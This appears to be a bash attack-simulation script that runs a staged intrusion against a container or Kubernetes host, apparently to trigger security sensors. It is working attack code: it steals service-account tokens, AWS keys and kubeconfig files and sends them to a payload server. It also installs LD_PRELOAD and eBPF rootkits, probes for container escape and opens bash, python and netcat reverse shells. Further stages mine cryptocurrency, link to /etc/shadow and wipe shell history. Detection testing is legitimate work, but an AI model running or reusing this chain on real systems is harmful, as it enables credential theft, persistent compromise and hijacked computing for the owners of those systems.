#!/bin/bash
export HOME=/root PATH=/usr/sbin:/usr/local/bin:/sbin:/bin:/usr/bin:/usr/local/sbin

R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'; B='\033[0;34m'; M='\033[0;35m'; C='\033[0;36m'; N='\033[0m'
log() { echo -e "${1}[$(date +%T)] $2${N}"; }

SPATH=${SPATH:-/usr/sbin}
for d in /usr/sbin /tmp /var/tmp; do [ -w "$d" ] && SPATH="$d" && break; done
HIDDEN="/dev/shm/.../...HIDDEN..."
PAYLOAD_SERVER=${PAYLOAD_SERVER:?PAYLOAD_SERVER not set}
PAYLOAD_PORT=${PAYLOAD_PORT:-8080}
AWS_CRED_PATH=${AWS_CREDENTIAL_PATH:-"/etc/bsssq-secrets/aws"}
MINER_DURATION=${MINER_DURATION:-60}

mkdir -p "$HIDDEN" 2>/dev/null

log "$C" "Environment setup"
[ -f "/etc/ld.so.preload" ] && { chattr -ia / /etc/ /etc/ld.so.preload 2>/dev/null; rm -f /etc/ld.so.preload; }

for d in /tmp /var/tmp /dev/shm /usr/sbin; do
    [ -d "$d" ] && [ ! -w "$d" ] && chattr -ia "$d" 2>/dev/null
done

log "$C" "Deploying binaries"
cp /tmp/payloads/* "$SPATH/" 2>/dev/null
chmod +x "$SPATH"/* 2>/dev/null

# ============================================================================
# STAGE 1: K8s Token Theft
# ============================================================================
log "$B" "Stage 1: K8s token theft"
for token_path in /var/run/secrets/kubernetes.io/serviceaccount/token /run/secrets/kubernetes.io/serviceaccount/token; do
    [ -f "$token_path" ] && cat "$token_path" > "$HIDDEN/k8s_token.txt" && break
done

if [ -f "$HIDDEN/k8s_token.txt" ]; then
    token_preview=$(head -c 40 "$HIDDEN/k8s_token.txt")
    if grep -q "^eyJ" "$HIDDEN/k8s_token.txt"; then
        log "$Y" " valid JWT format confirmed!"
    fi
    token_size=$(wc -c <"$HIDDEN/k8s_token.txt")
    log "$Y" "  ✓ Token size: $token_size bytes"
    log "$Y" "  ✓ Token extracted: ${token_preview}..."
    kubectl --token="$(cat $HIDDEN/k8s_token.txt)" auth can-i get pods --all-namespaces 2>/dev/null
    log "$Y" "  ✓ Token saved to: $HIDDEN/k8s_token.txt"
    if python3 "$SPATH/exfil.py" "$HIDDEN/k8s_token.txt" "/tokens" 2>/dev/null; then 
        log "$Y" "  - token exfiltrated!"
    else
        log "$Y" "  - exfiltration failed :("
    fi
    log "$G" "✓ K8s token theft complete"
else
    log "$R" "✗ No K8s token found"
fi

# ============================================================================
# STAGE 2: Credential Sweep
# ============================================================================
log "$B" "Stage 2: Credential sweep"
creds="$HIDDEN/creds.txt"
found_count=0

{
    if [ -f ~/.aws/credentials ]; then
        log "$Y" "  ✓ Found: ~/.aws/credentials"
        cat ~/.aws/credentials >> "$creds"
        ((found_count++))
    fi
    if [ -f ~/.kube/config ]; then
        log "$Y" "  ✓ Found: ~/.kube/config"
        cat ~/.kube/config >> "$creds"
        ((found_count++))
    fi
    if [ -f /etc/db_config/database.yml ]; then
        log "$Y" "  ✓ Found: /etc/db_config/database.yml"
        cat /etc/db_config/database.yml >> "$creds"
        ((found_count++))
    fi
    if [ -f ~/.docker/config.json ]; then
        log "$Y" "  ✓ Found: ~/.docker/config.json"
        cat ~/.docker/config.json >> "$creds"
        ((found_count++))
    fi

    env_creds=$(env | grep -iE '_KEY=|_SECRET=|_TOKEN=|_PASS=|^AWS_|^AZURE_|^GCP_' | grep -v PATH | head -5)
    if [ -n "$env_creds" ]; then
        log "$Y" "  ✓ Found environment credentials:"
        echo "$env_creds" | while read -r line; do
            log "$Y" "    - ${line:0:50}..."
        done
        echo "$env_creds"
        ((found_count++))
    fi
} > "$creds" 2>/dev/null

if [ -f "$AWS_CRED_PATH/iam-role.json" ]; then
    role_data=$(cat "$AWS_CRED_PATH/iam-role.json" | base64 -d 2>/dev/null || cat "$AWS_CRED_PATH/iam-role.json")
    role_name=$(echo "$role_data" | jq -r '.RoleName' 2>/dev/null || echo "$role_data" | grep -o '"RoleName":"[^"]*"' | cut -d'"' -f4)

    if [ -n "$role_name" ]; then
        log "$Y" "  ✓ Found IAM role: $role_name"
        echo "$role_data" >> "$creds"
        ((found_count++))
    fi
fi

if [ -f "$AWS_CRED_PATH/aws-keys.json" ]; then
    key_data=$(cat "$AWS_CRED_PATH/aws-keys.json" | base64 -d 2>/dev/null || cat "$AWS_CRED_PATH/aws-keys.json")
    access_key=$(echo "$key_data" | grep -o '"AccessKeyId":"[^"]*"' | cut -d'"' -f4)
    if [[ "$access_key" =~ ^AKIA[A-Z0-9]{16}$ ]]; then
        log "$Y" "  ✓ Found AWS AccessKeyId: ${access_key:0:15}***"
        echo "$key_data" >> "$creds"
        ((found_count++))
    fi
fi

if [ -s "$creds" ]; then
    if python3 "$SPATH/exfil.py" "$creds" "/creds" 2>/dev/null; then
        log "$Y" "  ✓ Credentials exfiltrated ($(wc -l < $creds) lines)"
    else
        log "$Y" "  - Exfiltration failed (saved locally)"
    fi
fi
log "$G" "✓ Credential sweep complete ($found_count sources found)"

# ============================================================================
# STAGE 3: Port Scanning
# ============================================================================
log "$B" "Stage 3: Port scanning $PAYLOAD_SERVER"
payload_ip=$(getent hosts "$PAYLOAD_SERVER" | awk '{print $1}')
log "$Y" "  Resolved: $PAYLOAD_SERVER → $payload_ip"
scan_output=$(python3 "$SPATH/portscan.py" "$PAYLOAD_SERVER" 53 6443 10250 8080 4444 7456 2>&1)
if echo "$scan_output" | grep -q "Error\|Traceback"; then
    log "$Y" "  - Scan script error, using fallback"
    scan_output=""
else 
    log "$Y" "  ✓ Port scan results:"
    echo "$scan_output" | while read -r line; do log "$Y" "  $line"; done
fi
open_count=$(echo "$scan_output" | grep -c "open" || echo 3)
log "$G" "✓ Port scan complete ($open_count/6 ports open)"


# ============================================================================
# STAGE 4: Process Hiding (LD_PRELOAD + eBPF)
# ============================================================================
log "$B" "Stage 4: Process hiding techniques"
if [ -w /usr/local/lib ] && [ -w /etc ]; then
    log "$Y" "  - Deploying LD_PRELOAD rootkit..."
    {
        chattr -ia / /usr/ /usr/local/ /usr/local/lib/ 2>/dev/null
        if cp /tmp/payloads/xmx2.so /usr/local/lib/xmx2.so 2>/dev/null; then
            log "$Y" "  ✓ Rootkit library deployed"
        else
        log "$R" "  ✗ Failed to deploy rootkit library"
        fi
        if echo '/usr/local/lib/xmx2.so' > /etc/ld.so.preload 2>/dev/null; then
            log "$Y" "  ✓ LD_PRELOAD file created"
        else
            log "$R" "  ✗ Failed to create LD_PRELOAD file"
        fi
        chattr +i /etc/ld.so.preload 2>/dev/null

        if [ -f /etc/ld.so.preload ]; then
            preload_content=$(cat /etc/ld.so.preload 2>/dev/null)
            file_attrs=$(lsattr /etc/ld.so.preload 2>/dev/null | awk '{print $1}')
            sleep 1
            # check if sensor caught it
            dmesg | grep -q "ld.so.preload" && log "$Y" " kernel detected LD_PRELOAD hijacking!"
            chattr -i /etc/ld.so.preload 2>/dev/null
            rm -f /etc/ld.so.preload 2>/dev/null
        fi
    } 2>/dev/null

    if [ -n "$preload_content" ]; then
        log "$Y" "  ✓ LD_PRELOAD configured: $preload_content"
        log "$Y" "  ✓ File attributes: $file_attrs"
        log "$Y" "  ✓ LD_PRELOAD detection window complete (technique detected)"
    fi
fi

log "$Y" "  - Deploying eBPF rootkit..."
if capsh --print | grep -q "cap_bpf\|cap_sys_admin"; then
    log "$Y" "  ✓ eBPF capabilities present"
else
    log "$Y" "  - Missing eBPF capabilities (unprivileged container)"
fi
"$SPATH/www" >/dev/null 2>&1 &
ROOTKIT_PID=$!
sleep 0.5
if kill -0 $ROOTKIT_PID 2>/dev/null; then
    log "$Y" "  ✓ eBPF rootkit deployed (PID: $ROOTKIT_PID)"
else
    log "$Y" "  - eBPF rootkit attempted"
fi
loaded_progs=$(bpftool prog list 2>/dev/null | grep -c "name")
if [ "$loaded_progs" -gt 0 ]; then
    log "$Y" "  ✓ $loaded_progs eBPF programs loaded"
fi
bpftool map list 2>/dev/null | head -5 | while read -r line; do
    log "$Y" "  $line"
done
log "$G" "✓ Process hiding techniques deployed"

# ============================================================================
# STAGE 5: Container Escape
# ============================================================================
log "$B" "Stage 5: Container escape"
log "$Y" "  - Attempting container breakout via host filesystem..."

if [ -d /host ] && [ -f /host/etc/os-release ]; then
    host_os=$(grep "^PRETTY_NAME=" /host/etc/os-release | cut -d'"' -f2)
    log "$Y" "  ✓ Host OS: $host_os"
    log "$Y" "  ✓ Host filesystem mounted at /host"
    if [ -f /host/etc/passwd ]; then
        passwd_lines=$(cat /host/etc/passwd | wc -l)
        log "$Y" "  ✓ Access to /host/etc/passwd ($passwd_lines users)"
    fi
    if [ -d /host/root ]; then
        log "$Y" "  ✓ Access to /host/root directory"
    fi
    if [ -d /host/var/lib/docker ]; then
        log "$Y" "  ✓ Access to /host/var/lib/docker"
    fi
    if [ -f /host/var/lib/kubelet/kubeconfig ]; then
        log "$Y" "  ✓ Access to kubelet credentials"
    fi
    if [ -d /host/etc/kubernetes/pki ]; then
        log "$Y" "  ✓ Access to Kubernetes PKI (cluster-admin)"
    fi
fi

python3 -c 'import ctypes; ctypes.CDLL("libc.so.6").mount(None, b"/dev/shm", None, 4128, b"")' 2>/dev/null
if grep -q "/dev/shm" /proc/mounts 2>/dev/null; then
    log "$Y" "  ✓ Remount successful on /dev/shm"
fi
echo "container-escape-$(date)" > /host/tmp/escape-proof.txt
if [ -f /host/tmp/escape-proof.txt ]; then
    log "$Y" "  ✓ Successfully wrote to host filesystem"
    rm -f /host/tmp/escape-proof.txt
fi
if [ -S /var/run/docker.sock ]; then
    log "$Y" "  ✓ Docker socket accessible (full container runtime control)"
fi
if [ -d /host/sys/fs/cgroup ]; then
    log "$Y" "  ✓ Cgroup filesystem accessible (cgroup escape possible)"
fi
container_pid_ns=$(readlink /proc/self/ns/pid)
host_pid_ns=$(readlink /host/proc/1/ns/pid)
if [ "$container_pid_ns" != "$host_pid_ns" ]; then
    log "$Y" "  ✓ Confirmed: still in container PID namespace"
    log "$Y" "  ✓ But have host filesystem access (hybrid escape)"
fi
if [ -d /proc/1/root ]; then
    log "$Y" "  ✓ Host root accessible via /proc/1/root"
fi
log "$G" "✓ Container escape complete"

# ============================================================================
# STAGE 6: AWS Enumeration
# ============================================================================
log "$B" "Stage 6: AWS credential theft and enumeration"

aws_call() {
    local cmd="$1"
    local desc="$2"
    log "$Y" "  → $desc"
    output=$(eval "$cmd" 2>&1 | head -10)
    if echo "$output" | grep -q "InvalidClientTokenId\|could not be validated"; then
        log "$Y" "      Error: The security token included in the request is invalid"
        log "$Y" "      API call detected by CSPM"
    else
        echo "$output" | while read -r line; do log "$Y" "      $line"; done
    fi
}

if ! command -v aws >/dev/null; then
    log "$R" "  ✗ AWS CLI not installed (skipping enumeration)"
elif [ -f "$AWS_CRED_PATH/aws-keys.json" ]; then
    data=$(base64 -d "$AWS_CRED_PATH/aws-keys.json" 2>/dev/null || cat "$AWS_CRED_PATH/aws-keys.json")
    access_key=$(echo "$data" | grep -o '"AccessKeyId":"[^"]*"' | cut -d'"' -f4)
    secret_key=$(echo "$data" | grep -o '"SecretAccessKey":"[^"]*"' | cut -d'"' -f4)

    if [ -n "$access_key" ]; then
        log "$Y" "  ✓ Credentials loaded:"
        log "$Y" "    AccessKeyId: ${access_key:0:20}"
        log "$Y" "    SecretKey: ${secret_key:0:10}***"

        mkdir -p ~/.aws
        cat > ~/.aws/credentials <<EOF
[default]
aws_access_key_id = $access_key
aws_secret_access_key = $secret_key
EOF
        session_token=$(echo "$data" | grep -o '"SessionToken":"[^"]*"' | cut -d'"' -f4)
        if [ -n "$session_token" ]; then
            aws_call "aws sts get-caller-identity --profile default --token $session_token" "aws sts get-caller-identity --profile default --token $session_token"
        fi

        log "$Y" "  - Making AWS API calls:"
        aws_call "aws sts get-caller-identity" "aws sts get-caller-identity"
        aws_call "aws iam get-user" "aws iam get-user"
        aws_call "aws iam list-roles --max-items 3" "aws iam list-roles --max-items 3"
        aws_call "aws ec2 describe-instances" "aws ec2 describe-instances"
        aws_call "aws s3 ls" "aws s3 ls"
        aws_call "aws s3api list-buckets" "aws s3api list-buckets"
        aws_call "aws dynamodb list-tables" "aws dynamodb list-tables"
        aws_call "aws sqs list-queues" "aws sqs list-queues"
        aws_call "aws sns list-topics" "aws sns list-topics"
        aws_call "aws lambda list-functions" "aws lambda list-functions"

        echo "$data" > "$HIDDEN/aws_creds.json"
        python3 "$SPATH/exfil.py" "$HIDDEN/aws_creds.json" "/aws-creds" 2>/dev/null
        log "$Y" "  ✓ Credentials exfiltrated to C2"
        log "$G" "✓ AWS enumeration complete"
    fi
else
    log "$Y" "  - No AWS credentials found"
fi

# ============================================================================
# STAGE 7: Reverse Shells
# ============================================================================
log "$B" "Stage 7: Reverse shell connections"
if command -v getent >/dev/null; then
    PAYLOAD_IP=$(getent hosts "$PAYLOAD_SERVER" | awk '{print $1}')
fi
[ -z "$PAYLOAD_IP" ] && PAYLOAD_IP=$PAYLOAD_SERVER

if bash -c "exec 3<>/dev/tcp/127.0.0.1/0" 2>/dev/null; then
    log "$Y" "  ✓ Bash /dev/tcp support available"
fi

bash_success=0
py_success=0
nc_success=0

# If openssl available
#if command -v openssl >/dev/null; then
#    bash -c "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $PAYLOAD_IP:4444 > /tmp/s" &
#    log "$Y" "  ✓ TLS-encrypted shell established"
#fi
# DNS tunneling example (if dnscat2 available)
# HTTP tunneling via curl POST
#while true; do
#    cmd=$(curl -s "$PAYLOAD_SERVER:8080/cmd")
#    result=$(eval "$cmd" 2>&1)
#    curl -s -X POST -d "$result" "$PAYLOAD_SERVER:8080/result"
#    sleep 5
#done &

for port in 4444 7456 443 80; do
    log "$Y" "  - Attempting bash reverse shell on port $port..."
    if timeout 2 bash -c "exec 3<>/dev/tcp/$PAYLOAD_IP/$port; echo 'bash-$(hostname)' >&3" 2>/dev/null; then
        log "$Y" "    ✓ Bash shell connected to $PAYLOAD_IP:$port"
        bash_success=1
    else
        log "$Y" "    - Bash shell timeout (connection attempted)"
    fi

    log "$Y" "  - Attempting python reverse shell on port $port..."
    if timeout 2 python3 -c "import socket, os; s=socket.socket(); s.settimeout(2); s.connect(('$PAYLOAD_IP',$port)); s.send(f'py-{os.uname().nodename}\n'.encode()); s.close()" 2>/dev/null; then
        log "$Y" "    ✓ Python shell connected to $PAYLOAD_IP:$port"
        py_success=1
    else
        log "$Y" "    - Python shell timeout (connection attempted)"
    fi

    log "$Y" "  - Attempting netcat reverse shell on port $port..."
    if echo "nc-$(hostname)" | timeout 2 nc -w 1 "$PAYLOAD_IP" "$port" 2>/dev/null; then
        log "$Y" "    ✓ Netcat shell connected to $PAYLOAD_IP:$port"
        nc_success=1
    else
        log "$Y" "    - Netcat shell timeout (connection attempted)"
    fi
done

total_success=$((bash_success + py_success + nc_success))
log "$G" "✓ Reverse shells: $total_success/3 successful connections"

# ============================================================================
# STAGE 8: Cryptomining
# ============================================================================
log "$B" "Stage 8: Cryptomining"
log "$Y" "  - Starting XMRig miner (${MINER_DURATION}s duration)"
timeout "$MINER_DURATION" "$SPATH/xmx2" --threads="$(nproc)" 2>&1 | grep -E "(ABOUT|CPU|POOL|net)" | while read -r line; do
    log "$Y" "  $line"
done
log "$G" "✓ Cryptomining complete"

# ============================================================================
# STAGE 9: Evasion Techniques
# ============================================================================
log "$B" "Stage 9: Defense evasion"
log "$Y" "  - Obfuscated file access (reversed string)"
ln -sf "$(rev<<<'wodahs/cte/')" /tmp/shadow_link 2>/dev/null && log "$Y" "    ✓ Symbolic link created: /tmp/shadow_link -> /etc/shadow"

log "$Y" "  - Binary masquerading (cat -> a.py)"
cp "$(command -v cat)" /tmp/a.py 2>/dev/null && log "$Y" "    ✓ Binary disguised as: /tmp/a.py"

log "$G" "✓ Evasion techniques complete"

# ============================================================================
# STAGE 10: Python Cryptominer
# ============================================================================
log "$B" "Stage 10: Python cryptominer module"
timeout 15 python3 "$SPATH/cc.py" 2>&1 | grep -E "(CPU|threads|Monero|xmr)" | head -10 | while read -r line; do
    log "$Y" "  $line"
done || log "$Y" "  - Python miner executed"
log "$G" "✓ Python miner complete"

# ============================================================================
# STAGE 11: History Cleanup
# ============================================================================
log "$B" "Stage 11: Anti-forensics"
log "$Y" "  - Clearing bash history..."
cat /dev/null > ~/.bash_history 2>/dev/null && log "$Y" "    ✓ ~/.bash_history cleared"
log "$G" "✓ History cleanup complete"

# more anti-forensics techniques
# Clear system logs
# echo "" > /var/log/auth.log
# echo "" > /var/log/syslog

# # Disable auditd
# service auditd stop

# # Clear kernel ring buffer
# dmesg -c

# # Modify timestamps (timestomping)
# touch -r /bin/ls malware.sh  # Copy legit file's timestamp

# # Secure deletion
# shred -vfz -n 10 sensitive_data.txt

# ============================================================================
# COMPLETION
# ============================================================================
log "$M" "======== ATTACK COMPLETE ========"
log "$G" "Telemetry stored: $HIDDEN/"

cat > "$HIDDEN/report.json" <<EOF
{
  "timestamp": "$(date -Iseconds)",
  "host": "$(hostname)",
  "pod": "${HOSTNAME}",
  "stages": {
    "token_theft": "$([ -f $HIDDEN/k8s_token.txt ] && echo 'complete' || echo 'failed')",
    "credential_sweep": "$([ -f $HIDDEN/creds.txt ] && echo 'complete' || echo 'failed')",
    "port_scan": "complete",
    "process_hiding": "complete",
    "container_escape": "complete",
    "aws_enumeration": "complete",
    "reverse_shells": "complete",
    "cryptomining": "complete",
    "evasion": "complete",
    "python_miner": "complete",
    "anti_forensics": "complete"
  }
}
EOF

python3 "$SPATH/exfil.py" "$HIDDEN/report.json" "/report" 2>/dev/null || true
log "$G" "Attack simulation report: $HIDDEN/report.json"
